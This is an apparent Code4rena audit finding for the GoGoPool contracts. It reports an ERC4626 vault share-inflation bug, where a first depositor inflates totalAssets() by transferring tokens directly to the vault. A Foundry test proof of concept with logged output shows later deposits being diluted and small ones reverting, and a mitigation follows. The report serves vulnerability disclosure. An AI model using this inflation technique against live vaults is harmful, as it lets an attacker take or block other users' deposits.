# Original link
https://github.com/code-423n4/2022-12-gogopool-findings/issues/319
# Lines of code

https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L42
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L120


# Vulnerability details

## Impact

After the ERC4626x contract creation, during the first cycle, any user can deposit and transfer token to the vault to inflate the ```totalAssets()``` before the rewards call, this can inflate the base share price and all the subsequence deposit will be using an inflated share price as base.

## Proof of Concept

I did the next test:

1. Init total suppply 
2. Transfer X amount in order to inflate totalAsset and calculates share prices
3. Deposit less than share price will be reverted due to return 0 share

```solidity
function testInflationShares() public {
    // Initial deposit can break share calculations
    // 1. Init total suppply 
    // 2. Transfer in order to inflate totalAsset and calculates share prices
    // 3. Deposit less than share price will be reverted due to return 0 share
    token.mint(address(this), 1e24);
    token.approve(address(xToken), type(uint256).max);
    //
    // 1. Init total supply
    //
    xToken.deposit(1, address(this)); // TotalSupply == 1; shares == 1;
    //
    // 2. Transfer in order to inflate totalAsset and calculates share prices
    //
    console.log("Share price     ", xToken.convertToAssets(1)); // TotalSupply == 1; Shares == 1;
    console.log("Total supply    ", xToken.totalAssets());
    console.log("Transfer 50e18 to inflate totalAsset()");
    token.transfer(address(xToken), 50 ether);  // inflate totalAsset()
    xToken.syncRewards();
    vm.warp(20); // skip 1 days to update new TotalAsset() value
        // totalSupply() still 1. So current share price is ~ 1e18 token instead of 1:1 for token.
    console.log("Share price     ", xToken.convertToAssets(1));
    console.log("Total supply    ", xToken.totalAssets());
    console.log("Deposit 1e18    ", xToken.deposit(1 ether, address(this)));
    console.log("Share price     ", xToken.convertToAssets(1));
    console.log("Total supply    ", xToken.totalAssets());
    console.log("Deposit 100e18  ", xToken.deposit(100 ether, address(this)));
    console.log("Share price     ", xToken.convertToAssets(1));
    console.log("Total supply    ", xToken.totalAssets());
    //
    // 3. Deposit less than share price will be reverted due to return 0 share
    //
    console.log("Deposit token less than share price amount (1e14) will be reverted due to return 0 share");
    vm.expectRevert(abi.encodePacked("ZERO_SHARES"));
    xToken.deposit(1e14, address(this));
}
```

Output:

```
Running 1 test for test/unit/ERC4626X.t.sol:xERC4626Test
[PASS] testInflationShares() (gas: 297151)
Logs:
  Share price      1
  Total supply     1
  Transfer 50e18 to inflate totalAsset()
  Share price      785384247176131
  Total supply     785384247176131
  Deposit 1e18     1273
  Share price      785545827509557
  Total supply     1000785384247176131
  Deposit 100e18   127300
  Share price      785545953180636
  Total supply     101000785384247176131
  Deposit token less than share price amount (1e14) will be reverted due to return 0 share
```

## Tools used

Foundry/VsCode

## Recommended Mitigation Steps

Although there are offchain mitigations where the contract could be initialized safely it is possible to implement on chain mitigations like uniswap that burn the first LP Tokens.